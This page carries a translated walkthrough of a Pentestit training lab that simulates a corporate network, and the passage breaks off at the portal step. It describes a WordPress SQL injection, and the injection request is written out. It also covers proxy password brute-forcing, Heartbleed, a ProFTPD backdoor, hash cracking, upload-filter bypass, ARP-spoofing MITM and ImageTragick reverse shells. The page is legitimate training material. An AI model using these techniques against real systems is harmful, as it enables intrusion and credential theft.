<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Pentest-laboratory Pentestit - full passage</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="On May 20, Pentestit launched a new, ninth laboratory to test practical penetration testing skills. 

 The laboratory is a corporate network, very sim...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Pentest-laboratory Pentestit - full passage</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/5ae/cfa/df0/5aecfadf0f9d4155b884142e24237a47.png"><br><br>  On May 20, Pentestit launched a new, <a href="https://habrahabr.ru/company/pentestit/blog/301046/">ninth laboratory</a> to test practical penetration testing skills. <br><br>  The laboratory is a corporate network, very similar to the network of this organization.  Thanks to the Pentestit laboratories, you can always be up to date with the latest vulnerabilities and try yourself as a real pentester, while at the same time learning from professionals - those who do penetration testing in real networks every day. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      By June 1, the laboratory was passed - all 13 machines and 14 tokens were taken.  Now it's time to describe the process of passing the laboratory in full for anyone who has not yet had time to pass the laboratory, who would like to learn more about current vulnerabilities, or to plunge deeper into the world of penetration testing. <br><br>  At once I want to note that the process of passing the laboratory turned out to be rather laborious, and its description was long, but I hope, interesting.  Let's start! <a name="habracut"></a><br><br><div class="spoiler">  <b class="spoiler_title">Disclaimer</b> <div class="spoiler_text"> I am not an employee or affiliate of Pentestit.  This document describes the steps I took to solve the tasks in the laboratory.  My personal recommendations and preferences do not in any way relate to the official opinion of Pentestit. <br><br>  All information in this document is provided for educational purposes only.  By continuing to read this document, you agree not to use this information for illegal purposes, and acknowledge that you and you alone are solely responsible for your actions or knowledge gained from the information in this document.  The author of this document and Pentestit will not be liable for any damage caused to anyone as a result of using the knowledge and methods gained from reading this document. <br></div></div><br><h2>  Connect to the lab </h2><br>  Before you begin, you need to register with the lab, set up a VPN connection and connect to the network of the virtual CyBear32C company. <br><br>  Register <a href="https://lab.pentestit.ru/pentestlabs/5">here</a> , and then follow <a href="https://lab.pentestit.ru/how-to-connect">these instructions</a> in order to connect. <br><br>  For testing, you can install in the <a href="https://www.kali.org/">Kali Linux</a> virtual machine - a special Linux distribution for pentesters, which has everything you need to work.  If you haven't done it yet, now is the time. <br><br><h1>  We start testing </h1><br>  After registering and connecting, we see the following network diagram: <br><img src="https://habrastorage.org/files/662/5b0/b89/6625b0b89a444122abc2b832f653ee8b.png"><br><br>  The VPN connection remains behind the scenes, and after it we get access to the only external IP of CyBear32C - 192.168.101.8, which in real life would be the gateway to the Internet.  We begin, as usual, with enumeration and, in particular, with port scanning, in order to determine which services from internal subnets are accessible from the outside. <br><br>  Let's start with a quick port scan. <br><br><img src="https://habrastorage.org/files/83c/94a/f4c/83c94af4c4b341fdb568fa6052ccae6a.png"><br><br>  As you can see, we have access to a whole range of services from different internal machines (see the network diagram), including, most likely, the mainsite server (port 80), the mail server (25, 8100), ssh (port 22), and others.  In addition, there is another https resource and proxy server. <br><br><h1>  Learn MAINSITE </h1><br>  To begin with, go to <a href="http://192.168.101.8/">192.168.101.8</a> : <br><br><img src="https://habrastorage.org/files/954/617/a54/954617a54eea4a84aa82a079155e5297.png" width="50%"><br><br>  We automatically redirect to <a href="http://www.cybear32c.lab/">www.cybear32c.lab</a> , let's take a closer look at this: <br><br><img src="https://habrastorage.org/files/d74/92d/513/d7492d5130004612bd3d99b012ad2d1f.png"><br><br>  We receive the header <code>Location: http://cybear32c.lab</code> - a virtual host, which actually will be accessible to the company's website. <br><br><img src="https://habrastorage.org/files/f3e/421/846/f3e4218465b34af4aeec2cd1054ee41d.png"><br><br>  Add the required domain to <code>/etc/hosts</code> and try again: <br><br><img src="https://habrastorage.org/files/95d/5a1/bd2/95d5a1bd2fdb469e98b79ebcca26ff1a.png"><br><br>  Great, the site has risen, and you can start exploring.  Let's try to understand what it is.  Before you start to study the site manually, you can run the utility whatweb, and then dirb, which will help determine which subdirectories there are (you can use other scanners, for example nikto): <br><br><img src="https://habrastorage.org/files/6e0/6cd/ea5/6e06cdea5cac43588b7f8cc7a4a5c05a.png"><br><br>  We see that the response codes for all requests are 403 - for sure the site is protected by WAF.  Since everything works in the browser, we try to substitute the User Agent and find some interesting pages: <br><br><img src="https://habrastorage.org/files/3c0/563/50b/3c056350bb8443e7a4a8c71a7c45ba5e.png"><br><br>  At the same time we are looking at the site, we see that this is Wordpress, protected by WAF.  Logging in to the / admin page takes us to a closed wp-login.php. <br><br><img src="https://habrastorage.org/files/b5d/593/f3f/b5d593f3faf64bc3b47f35b43d891cae.png"><br><br>  For Wordpress sites there is a great utility wpscan, which allows you to check them for plugins with vulnerabilities.  We try to start to see the general information on the site, substituting the desired user agent.  He immediately finds several problems, including the plugin wp-symposium v15.1 vulnerable to SQL injection. <br><br><img src="https://habrastorage.org/files/41a/431/cd8/41a431cd86da44ff93d4d5e50ede8188.png"><br><br>  Now we try to exploit each of these vulnerabilities with the help of exploits by links.  Unfortunately, WAF works, and queries with SQL payloads do not go through.  Let's try to get around it ... <br><br><h2>  WAF bypass </h2><br>  Often, many Web Application Firewalls use attack signatures that can be circumvented by slightly changing the syntax: adding concatenation or changing the case in the query: vErSiOn instead of version, for example.  Bypassing WAF is a separate serious topic that can be devoted to many books and articles. <br><br>  Unfortunately, these options did not work.  Recall the proxy on port 3128 and try to configure the browser to work through it. <br><br><img src="https://habrastorage.org/files/a02/3ef/c23/a023efc238094b5ba13a25f99ca75b1d.png" width="50%"><br><br>  Proxy requests authorization: <br><br><img src="https://habrastorage.org/files/6b8/9eb/e03/6b89ebe0350f4d0bbd8d0d22625c752e.png"><br><br>  Here we can use the data from the Contact Us column, which we see on the same site. <br><br>  Create a text file with a dictionary and two accounts: b.muncy and r.diaz and try to find the password: <br><br><img src="https://habrastorage.org/files/670/d04/49a/670d0449a5054cba9d1af5ecb8b439f9.png"><br><br>  Good luck!  Now we will try once again to enter the site through a proxy and log in to it.  The result in this case already looks different (the site is also available on the internal IP: 172.16.0.5, but other internal services are still unavailable): <br><br><img src="https://habrastorage.org/files/360/aad/1f1/360aad1f1d37451a8c47e75b34cab6b6.png"><br><br>  The site no longer speaks of misconduct - we have successfully bypassed WAF. <br><br><h2>  Exploitation of vulnerabilities in Wordpress plugin </h2><br>  Now you can explore the site and potential vulnerabilities more closely.  You can do this directly, but it is more convenient for me to use Burp Repeater for this.  First you need to configure the connection through upstream proxy: <br><br><img src="https://habrastorage.org/files/b21/f06/a4d/b21f06a4dec5464a8cfb658ceee9c194.png"><br><br>  In the User options tab, we add the Upstream Proxy Server, enter the data for our host, configure the browser for Burp proxy and try various exploits found by wpscan. <br><br>  The same feature will allow the use of utilities that do not support proxy authorization directly.  If you need these, it will be enough to specify in the form of proxy 127.0.0.1:8080. <br><br>  Having tried several options, we see that one of the SQL injections works: <br><br> <code>GET http://cybear32c.lab/wp-content/plugins/wp-symposium/get_album_item.php?size=version(); -- HTTP/1.1</code> <br> <br>  Get the MySQL version number: <br><br><img src="https://habrastorage.org/files/5f7/54a/91d/5f754a91dc734f65b8d0ec1c6c7d87ed.png"><br><br>  Result: 5.5.49-0 + deb8u1. <br><br>  Things are going well - it remains to exploit this vulnerability using sqlmap: <br><br><img src="https://habrastorage.org/files/821/c87/ec1/821c87ec1d6348828ada383c7c72076f.png"><br><br>  Since in this case the injection occurs in the column name (and not in the value, as usual), it is important to specify the suffix after payload ( <code>' -- '</code> ) in order for sqlmap to concentrate on this type of injection.  If this is not done, sqlmap can mistakenly define the type of injection as blind, and in this case it will be very difficult and long to pull the data. <br><br>  We obtain the available databases using the --dbs option: <br><br><img src="https://habrastorage.org/files/352/b01/9be/352b019be47c4d0bb2ea2dbc0e4a3053.png"><br><br>  Then the tables ( <code>-D tl9_mainsite --tables</code> ): <br><br><img src="https://habrastorage.org/files/d1f/919/5bd/d1f9195bd37a438981b0efcf4bf113df.png"><br><br>  And it remains only to obtain data from the wp_token table using the command: <br><br><img src="https://habrastorage.org/files/a39/1af/df4/a391afdf497a4f7a94e8589413b617da.png"><br><img src="https://habrastorage.org/files/3a6/9c6/742/3a69c6742b244773b46e316b9f0560ab.png"><br><br><h1>  BYPASS Token </h1><br>  During the port scan, an https resource was also found on port 443. A quick analysis and the dirb utility did not yield anything interesting: <br><br><img src="https://habrastorage.org/files/25a/e7b/d74/25ae7bd740c14d93b246d9e43f3ce747.png"><br><br>  The resource is available via https, while apparently in development and has not been updated for a long time.  Check for the heartbleed vulnerability in 2014: <br><br><img src="https://habrastorage.org/files/3cb/6d6/ac5/3cb6d6ac5b4d4ed383f53793360f121f.png"><br><br>  Service is vulnerable!  For operation, use the script <a href="https://gist.github.com/eelsivart/10174134">from here</a> .  After reading a lot of <s>interesting</s> information and hundreds of attempts (the main thing is not to give up ahead of time), we find something interesting: <br><br><img src="https://habrastorage.org/files/c66/d4f/cef/c66d4fcefbef47d5a3e5d94349ab3178.png"><br><br>  Someone went there and downloaded the old backup.  Let's do it and we will: <br><br><img src="https://habrastorage.org/files/a7c/f97/8ef/a7cf978efbb1443783c8892ce1dc5a8c.png"><br><br>  Here is the token, and along with it are several new accounts and their password hashes.  We try to recover passwords from hashes (Apache apr1 hash in hashcat hash number 1600): <br><br><img src="https://habrastorage.org/files/de0/38b/1d2/de038b1d2c97465bbf4c35661c1ddca9.png"><br><br>  We get the b.muncy password already known from mainsite, as well as other passwords of other accounts. <br><br>  It is very useful to record all found credentials and passwords in order to be able to check them in the future, quickly learning a new target, because  passwords of users in a corporate network with high probability will be repeated from one service to another. <br><br><h1>  We attack SSH </h1><br>  Despite the previous remark, unfortunately, none of the passwords found so far has come to the mail (which usually gives very good results in moving deeper into the corporate network).  It does not matter, we will try to connect to SSH on port 22 and try there.  We try and see the following picture: <br><br><img src="https://habrastorage.org/files/ce0/4d9/535/ce04d9535e59494abe3f427731c0aa5d.png"><br><br>  A rather unusual situation for connecting via SSH: apparently, it uses its own module for authentication.  In addition, we draw attention to the fact that the system first requests ‚ÄúThe password‚Äù, and then also ‚ÄúPassword‚Äù. <br><br>  We try all the credentials found in different combinations - to no avail. <br><br>  Since neither the mail nor the SSH brought the desired results, and there are no more other available services, apparently we have missed something.  SSH is also important because we will gain access to the inside of the corporate network and will be able to move forward, so we are interested to concentrate on it. <br><br>  We try again and see the author of the script: Pam ¬© krakenwaffe - does not look like something standard. <br>  We are looking for this in Google and soon we find a krakenwaffe developer account on Github, which also works for cybear32c - interesting! <br><br><img src="https://habrastorage.org/files/599/923/4cb/5999234cb86040bcbc54e0885a95fa3f.png"><br><br>  After reviewing the contributions of a certain David, we see a single file: mypam.c, located here: <a href="">github.com/krakenwaffe/eyelog/blob/master/mypam.c</a> .  After a quick analysis of the code, it becomes clear that this is the module in which we are trying to log in, and which requests ‚ÄúThe password‚Äù from us. <br><br><img src="https://habrastorage.org/files/dd1/fad/591/dd1fad5918c348fead0898ec6a392c0c.png"><br><br>  It‚Äôs impossible to enter under the root, see what‚Äôs next ... Attention attracts the following site: <br><br><img src="https://habrastorage.org/files/faf/a30/8b6/fafa308b6cd344d8a0f0a40ca525dead.png"><br><br>  We see that the entered password is compared with <code>daypass&lt;&gt;&lt;&gt;</code> .  We try to substitute the current value, namely ‚Äúdaypass80‚Äù at the time of writing this part of the document: <br><br><img src="https://habrastorage.org/files/1f8/ffa/1dc/1f8ffa1dc6844d8dabe38871a1ec9a06.png"><br><br>  It still does not work.  Then we remember the name of our developer, who shared a password with us through Github - David Nash.  We try to go under d.nash: <br><br><img src="https://habrastorage.org/files/4b4/4d6/fca/4b44d6fca419409884dd4b5e44bef919.png"><br><br>  Happened!  We went to the SSH server.  Let's see what is around: <br><br><img src="https://habrastorage.org/files/5dc/441/75c/5dc44175c3e547c59e4c0c9a7d0f7213.png"><br><br>  In addition to the token, in the .ssh folder we also find the private key for connecting to other servers (which you can find out by working with the known_hosts file) - it will certainly come in handy later! <br><br>  Now we get a springboard for the next attacks, and before us opens the entire corporate network of the company CyBear32C. <br><br><h1>  Next steps </h1><br>  After taking SSH, you can access all other computers on the network.  Where to start?  The first step is to scan all three subnets using nmap, kindly provided to us directly on the SSH server, and examine the available services. <br><br>  At this stage, almost all internal resources, with the exception of Windows machines and the dev server, will be available for attack - you can forward ports and try. <br><br><h2>  Port forwarding </h2><br>  To provide convenient access to the internal network through the newly appeared SSH connection, there are a lot of ways. <br><br>  First of all I recommend to study the article <a href="https://habrahabr.ru/post/302168/">‚ÄúPivoting or port forwarding‚Äù</a> . <br><br>  In addition, it is useful to know the interesting feature of the standard SSH client: port forwarding without restarting the session and adding parameters to the command line. <br><br>  To do this, just press the key combination Shift + ~ + C and go to the command mode: <br><br><img src="https://habrastorage.org/files/de6/5af/6ff/de65af6ff4024f01b058ebda521ca7fc.png"><br><br>  After entering the necessary command, we will get access to port 80 of the server 192.168.0.6 (photo) via port 8086 to 127.0.0.1: <br><br><img src="https://habrastorage.org/files/d0c/53d/ed2/d0c53ded2e6b4fdf932efcb375fb4392.png"><br><br><h1>  Photo-hosting and file uploading </h1><br>  The photo server meets us with a file upload form and nothing else, for sure there is a vulnerability in it. <br><br>  From the developer‚Äôs point of view, it‚Äôs very difficult to upload files safely - there can be a lot of attack vectors: this is either a failed validation by file extension, its MIME type, or a vulnerability in the library that processes the file, or race condition, or any of the many other problems. <br><br>  First, let's see what the site is written on: <br><br><img src="https://habrastorage.org/files/bf8/29f/ac5/bf829fac54dd4a3caea92334e4465a0a.png"><br><br>  And at the same time run dirb to see which hidden directories are on the web server. <br><br><img src="https://habrastorage.org/files/fd3/46a/96e/fd346a96e3264309aa12fdab9b398857.png"><br><br>  The upload directory is available directly on the server, we will try to upload a harmless image and make sure that the files are saved in this folder: <br><br><img src="https://habrastorage.org/files/f80/45f/0bd/f8045f0bd0754c579e6a96092410cb01.png"><br><br>  So google.png is available.  Please note that the site shows the size of the image, apparently there is some kind of analysis.  Trying to download the PHP file: <br><br><img src="https://habrastorage.org/files/93d/c63/71c/93dc6371cc9d46c1b4597172d68cd300.png" width="40%"><br><br>  Changing the MIME type and extension does not help: <br><br><img src="https://habrastorage.org/files/49f/16a/150/49f16a150be14fb7b52dcbcd2ac34692.png" width="40%"><br><br>  Interestingly, it gives us two tips at once: first, the file may be loaded first, and then deleted, and you can manage to pull it, and, second, we make sure once again that there is a check that this picture is present (Apparently, using <code>getimagesize()</code> , which can be fooled by adding, for example, a GIF header).  We try again with such file file.jpg: <br><br><img src="https://habrastorage.org/files/1fa/bbd/507/1fabbd5071f34786bae414a41e29dd92.png"><br><br>  File uploaded successfully and even available: <br><br><img src="https://habrastorage.org/files/e58/46e/6df/e5846e6dff774e2bab941c3899d5b0a4.png"><br><br>  But, unfortunately, is not satisfied.  We try to download this file with different extensions, since php does not work: .htaccess, .php5, .phtml and .pht - the last option works!  It is also executed: <br><br><img src="https://habrastorage.org/files/248/a99/e38/248a99e381194876b6327f606d8009c3.png"><br><br>  Now you need to get a shell.  To do this, listen with nc on the SSH server, and access the file: <br><br><img src="https://habrastorage.org/files/04f/5b2/d96/04f5b2d96eb049bfbe8ef166898b6939.png"><br><img src="https://habrastorage.org/files/354/ce3/080/354ce30803714af7958059aca7a76646.png"><br><br>  And successfully we get the connection: <br><br><img src="https://habrastorage.org/files/4bd/723/515/4bd7235152974c2c955d02de13977bec.png"><br><br>  Right in the upload folder you can find the token in a hidden subdirectory: <br><br><img src="https://habrastorage.org/files/3e3/b23/fd4/3e3b23fd4a7d47f7b3c555a6481b318c.png"><br><br>  By the way, for the sake of interest, you can explore the source code: <br><br><img src="https://habrastorage.org/files/1b9/e06/276/1b9e062765f34e0eaf7774d4484f8cd7.png"><br><br>  We see that the file is first saved to a folder, and then only checked, that is, in addition to the vulnerability we have exploited, there is also a race condition. <br><br>  In addition to the token and this code on the server, we find nothing interesting and continue on! <br><br><h1>  Learn FTP </h1><br>  Having scanned using nmap server 172.16.0.4, we find the open port 21 (ftp) and port 22 (ssh).  Naturally, the input with our ssh key does not work, so we concentrate on the FTP itself. <br><br><img src="https://habrastorage.org/files/0c9/de2/0a2/0c9de20a26084d42b83d53c0e52e5664.png"><br><br>  ProFTPD 1.3.5 has a known vulnerability associated with copying files without authentication, which can be exploited through a web server - we copy to / var / www, for example, / etc / passwd, and we are already a little closer to the goal. <br><br>  The problem is that the web server on this machine is not running ... Let's try to connect to an ftp server: <br><br><img src="https://habrastorage.org/files/e77/e59/a58/e77e59a588d54528abc752cd0ce14246.png"><br><br>  Anonymous login is available, and in the dist folder we find the source of the server.  Interestingly, they were probably laid out for a reason, we will try to study them.  Download and unpack the proftpd-dfsg-1.3.5.tar.bz2 archive using the ftp client (lcd and get commands) and try to look for changes in the code.  Let's start with the search for the CYBEAR substring, and immediately find the src / help.c file: <br><br><img src="https://habrastorage.org/files/7b7/835/3f8/7b78353f83a54b32a4709f81c872fcae.png"><br><br>  A similar backdoor was built into version 1.3.3c during the <a href="https://www.aldeid.com/wiki/Exploits/proftpd-1.3.3c-backdoor">attack on ProFTPD</a> . <br><br>  Let's try to use the provided backdoor! <br><br><img src="https://habrastorage.org/files/b5e/d09/9f5/b5ed099f59f048c9ba5bf886f9bf0c37.png"><br><br>  Well, in the folder / home we find a whole set of interesting files: <br><br><img src="https://habrastorage.org/files/de8/2e3/c2f/de82e3c2fca74adc804216a9167221da.png"><br><br>  In addition to the token in the ‚Äúold‚Äù folder, we find: <br><ul><li>  new account m.barry, </li><li>  test script in m.barry / upload / test_scripts folder, </li><li>  cisco router configuration file with passwords <br><img src="https://habrastorage.org/files/2d9/a36/575/2d9a365750b646888ea71c30e5589119.png"></li><li>  The trouble.cap file with the password m.barry and an indication that the dev server downloads all the Python scripts from the test_scripts folder with FTP and, possibly, launches them. <br><img src="https://habrastorage.org/files/1d1/504/2e5/1d15042e5d2042f68afea9cf222e9725.png"></li></ul><br>  Unfortunately, it is impossible to simply enclose the file in test_scripts - not enough rights, so you have to go further and look for another way to attack the dev server. <br><br><h1>  The fastest token is CISCO </h1><br>  Let's try to use the information found and start with cisco - we already have the password.  We recollect IP according to the network diagram and try to log in: <br><br><img src="https://habrastorage.org/files/d55/678/740/d556787403c941bca4baf5a01222bdb3.png"><br><br>  Immediately we get a token!  Now let's try to clear the hash for enable 3: <br><br><img src="https://habrastorage.org/files/ac6/885/ca2/ac6885ca289048f298598c6c83f9f1d1.png"><br><br>  Find the password, try it and get the privileged mode: <br><br><img src="https://habrastorage.org/files/3c2/4d6/0c8/3c24d60c80d84ae1a1e86d82b4513797.png"><br><br>  All is ready.  The configuration file of the router allows you to monitor traffic: <br><br><img src="https://habrastorage.org/files/2d8/3c2/0d7/2d83c20d7fc845e190cb232012846d38.png"><br><br>  With the help of these commands you can study the traffic going through this subnet (namely, the portal). <br><br>  As it turned out, there are opportunities to go through the laboratory in different ways, and I personally did not need to monitor the traffic.  Therefore, I propose to leave this part to independent study and move on. <br><br><h1>  NAS and unprotected backups </h1><br>  Continuing to explore different subnets, we come across a NAS server: <br><br><img src="https://habrastorage.org/files/a5e/c1d/c5e/a5ec1dc5eee546468b9a20442bf72396.png"><br><br>  Open port 3260 hints at the ability to connect to iscsi.  If you followed the news in the field of information security, you probably heard about the hacking of the Italian company Hacking Team, which in this case became the prototype of CyBear32c.  On the net you can find a writeup about how the attack took place, from which you can learn a lot of interesting things. <br><br>  Let's start with port forwarding to the local machine: <br><br><img src="https://habrastorage.org/files/e7a/c74/8da/e7ac748da2b949688d1073a4fd51f50b.png"><br><br>  Install iscsiadm and try to connect: <br><br><img src="https://habrastorage.org/files/9af/094/1eb/9af0941ebbaf4461a0608effc5589546.png"><br><br>  We try to connect, it does not work. <br><br><img src="https://habrastorage.org/files/90b/fc6/973/90bfc6973a024036b591605577d710fb.png"><br><br>  We turn on debug mode and see that iscsiadm is trying to connect to 192.168.0.3, which in this case is not in our subnet. <br><br>  Let's try an alternative port forwarding and use <a href="http://sshuttle.readthedocs.io/en/stable/installation.html">sshuttle</a> .  So we will get access to the servers at their real IP addresses without having to forward each port separately.  Connect: <br><br><img src="https://habrastorage.org/files/6ae/b1c/678/6aeb1c678bc54b5eb2f9f87dbb5c5711.png"><br><br>  I managed to connect!  Now examine the contents of the appeared disk: <br><br><img src="https://habrastorage.org/files/66f/1f2/5bd/66f1f25bd19a47498c24fc084dab71eb.png"><br><br>  Now you need to connect this vmdk: <br><br><img src="https://habrastorage.org/files/44a/96f/62c/44a96f62cdcc4414ac8a984a3d928f2b.png"><br><br>  It begins on the disk at an offset of 63 * 512 bytes, namely 32,256: <br><br><img src="https://habrastorage.org/files/597/36c/9a8/59736c9a8a2f44709e60c80dc21909ad.png"><br><br>  After this, Kali automatically detects the present disk and offers to see the contents: <br><br><img src="https://habrastorage.org/files/d8e/2b5/dee/d8e2b5dee68244aba0f8689fd1029784.png"><br><br>  There is!  Looking for something interesting, we find the user token_nas_token, but there‚Äôs nothing directly in the file system.  Copy the registry database from WINDOWS \ system32 \ config to yourself and try to look at the saved password hashes: <br><br><img src="https://habrastorage.org/files/4ba/cd1/92e/4bacd192e16c422fb2df21e826670e20.png"><br><br>  In order not to go through the hashes locally for a long time, we will use the <a href="http://rainbowtables.it64.com/">rainbowtables.it64.com</a> service.  You can do it yourself, but it will be faster with the help of the service. <br><br>  We enter the existing LM hashes (the first hash of the dump in each row) and look at the result.  LM hashing results in uppercase passwords, so after getting the result, we will need to restore the correct register using the NTLM hash. <br><br>  All the hashes and their corresponding passwords are found in the database.  Save them (in upper case) in a separate file and use john with the -rules = NT option to find the correct passwords: <br><br><img src="https://habrastorage.org/files/ad3/f16/13f/ad3f1613f07a4eff96ff4727d816815a.png"><br><br>  And we get passwords using the -show option: <br><br><img src="https://habrastorage.org/files/b04/430/322/b0443032263c4d9f962b5797ccb014c9.png"><br><br>  The password from token_nas_token contains a token to the task!  And we got new credentials for d.rector.  We continue! <br><br><h1>  Terminal2 </h1><br>  As discussed above, passwords found in one place may come up in another.  In this case, after scanning the ports of the terminal2 server, we see an open RDP: <br><br><img src="https://habrastorage.org/files/2f6/e7e/5ee/2f6e7e5ee33c45dcbb93defb6422ecc2.png"><br><br>  Let's try to connect using d.rector credentials from NAS: <br><br><img src="https://habrastorage.org/files/128/05b/920/12805b9203cf4260a958115296c5eecd.png"><br><br>  The token is right on your desktop! <br><br><h1>  DEV and MITM </h1><br>  With access to the local subnet 192.168.3 / 24, we open up new opportunities for attack.  Let us recall the network diagram and at the same time the file trouble.cap found on the FTP server: <br><br><img src="https://habrastorage.org/files/a41/711/473/a41711473a3944f995ad7ae8b9923db3.png"><br><br>  Obviously, the dev server accesses FTP, downloads all the * .py files from the test_scripts folder from there, as seen in trouble.cap, and most likely executes them.  Access to this folder on the FTP server can be obtained only from root. <br><br>  Now that we have a terminal server at our disposal, where Intercepter-NG is conveniently located, we can easily organize a MITM attack.  Let's try! <br><br>  Turn on Intercepter-NG from the folder C: \ Intercepter-NG.  The first step is to scan the local network.  Right-click on an empty place in the table, set up just in case more ARP Scan Timeout and launch Smart Scan. <br><br>  At the same time, Intercepter sends ARP requests in its subnet to determine the existing hosts in it, and then tries to determine which OS is installed on each of them. <br><br><img src="https://habrastorage.org/files/60b/25e/482/60b25e482050449e92603a2c2184ceb3.png"><br><br>  Well, two hosts were defined: <br><br><img src="https://habrastorage.org/files/77f/b63/b31/77fb63b3144f46bdbfc0ec6fe275c865.png"><br><br>  Stealth IP is a non-existent IP address that is used by the Intercepter to perform a MITM attack. <br><br>  Since the client and server are on different subnets, they will communicate with each other through the gateway;  we add 3.3 to NAT, and 3.254 as the gateway. <br><br><img src="https://habrastorage.org/files/82a/303/c14/82a303c14e6e4557b1079dc19699e585.png"><br><br>  In parallel, you need to create a daddy on the ftp server, in which dev will enter, instead of the upload folder.  The name should have as many characters as it does in the ‚Äúupload‚Äù, since the Intercepter-NG can only replace the traffic for lines of the same length in the traffic. <br><br><img src="https://habrastorage.org/files/515/0a8/24a/5150a824afab41a7a66b7a694987eac9.png"><br><br>  In the test.py script, of course, we will place the payload - reverse the shell to 172.16.0.2 on port 6666: <br><br><img src="https://habrastorage.org/files/11e/2bc/a75/11e2bca754c84633ad026a1c9906e2e4.png"><br><br>  Configure Intercepter: <br><br><img src="https://habrastorage.org/files/2b1/9ed/541/2b19ed5419ba4cb1ac72685280610ce3.png"><br><br>  Traffic changer will replace upload with .uploa and, accordingly, when m.barry makes a CWD upload, it will go to our .uploa directory and from there it will download our script, which will create a reverse shell for us. <br><br>  We include the listening part on SSH: <br><br><img src="https://habrastorage.org/files/2ab/904/522/2ab904522c1f48aab3c54f1dfc42a600.png"><br><br>  And we turn on Incercepter by pressing three buttons: first, the general sniff-ing in the upper right, then NAT and then ARP poison. <br><br><img src="https://habrastorage.org/files/54b/210/9fb/54b2109fbead45c6aefeee1947eddf53.png"><br><br>  In a minute we get the shell: <br><br><img src="https://habrastorage.org/files/81e/5fe/fe9/81e5fefe91054494af3e79d3bfd76fd8.png"><br><br>  And at the same time the dev server token: <br><br><img src="https://habrastorage.org/files/702/6ba/8e7/7026ba8e7fde4f4d960ec468187f3bf7.png"><br><br><h1>  ‚ÄúTragick‚Äù SITE-TEST </h1><br>  Now let's turn our attention to the site-test server.  As usual in the lab's web tasks, try running whatweb and dirb to find out what is on the server. <br><br><img src="https://habrastorage.org/files/545/9e6/c78/5459e6c78eae4159b674da0949ee32b3.png"><br><br>  The site is written in PHP framework laravel, which is actively supported.  In addition, detailed error logs are included: <br><br><img src="https://habrastorage.org/files/842/f22/1fe/842f221fef4e46009705070238cda8a6.png"><br><br>  From here you can often extract information about the internal paths on the server, which can then be useful, for example, with SQL injection.  But in this case it does not help us much ... <br><br>  dirb quickly begins to find the following available URLs: <br><br><img src="https://habrastorage.org/files/835/3cf/3eb/8353cf3ebcfc45fc8bff9f76bcef5d11.png"><br><br>  Having unsuccessfully tried all the credentials that have already been collected during the passage of the laboratory in the admin panel, we switch to the photo upload form, also presented on the website, if you just walk through it and press JOIN US: <br><br><img src="https://habrastorage.org/files/aa1/b71/a06/aa1b71a060e54be5a20e7665bc6f422b.png"><br><br>  Downloading pictures again, but now you can‚Äôt find where these pictures are added together (although the / upload folder is also detected by the dirb utility after some time - but the files in it are not accessible by their original names). <br><br>  Let's try a vulnerability in ImageMagick, which is called <a href="https://imagetragick.com/">ImageTragick</a> . <br><br>  Construct the file to load: <br><br><img src="https://habrastorage.org/files/9f6/c09/98e/9f6c0998efa742e8a4f356a7bbe3addc.png"><br><br>  And we enable nc on port 1234 on the SSH server.  Fill out the form and load the file oops.jpg with the text content shown above. <br><br><img src="https://habrastorage.org/files/9a8/214/3ab/9a82143ab03e4477b309267d949142c2.png"><br><br>  Here is the connection!  In the root folder (cd /) we see token.txt: <br><br><img src="https://habrastorage.org/files/8f2/813/656/8f2813656ce34786a06e5cfa9ce1ac8a.png"><br><br><h1>  Open PORTAL </h1><br>  Let's try to explore the portal server.  Let's start with port scanning. <br><br><img src="https://habrastorage.org/files/755/902/81f/75590281fd094a21abe19bbf526a816c.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Port 8080 was found, going to which we, in fact, see the portal: </font></font><br><br><img src="https://habrastorage.org/files/60e/f52/f07/60ef52f07c7b4485bfcc2bf8d689ee2c.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Try different passwords from those that were found earlier. For example, login t.smith with his password. Passwords could be reused twice already - on terminal2 and here. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We </font></font><br><br><img src="https://habrastorage.org/files/66f/8b1/e84/66f8b1e8419e4c44aa373b7f61a6a3f5.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">get a </font><font style="vertical-align: 